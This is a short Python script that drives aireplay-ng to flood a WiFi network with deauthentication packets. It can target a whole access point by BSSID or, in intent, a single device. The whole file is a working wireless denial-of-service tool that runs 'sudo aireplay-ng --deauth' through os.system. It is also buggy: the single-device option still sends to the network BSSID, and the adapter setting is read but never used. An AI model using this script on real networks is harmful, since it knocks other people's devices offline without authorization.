from time import sleep
from os import system

options = str(input("Please choose to use the Network BSSID or target one device(Net for Entire Network OR One for One Device): "))
deauth_count = int(input("Please enter the number of deauthentication packets to send: "))

with open("bssid.n", "r") as bssid_read:
	bssid = bssid_read.read()
	
with open("settings.set", "r") as read_adapter:
	adapter = read_adapter.read()
	
def deauthentication(Bssid, Deauth_Count):
	system(f"sudo aireplay-ng --deauth {Deauth_Count} -a {bssid} wlp2s0mon")

if options == "Net":
	deauthentication(bssid, deauth_count)
elif options == "One":
	BID = str(input("Please enter the target Device: "))
	deauthentication(BID, deauth_count)

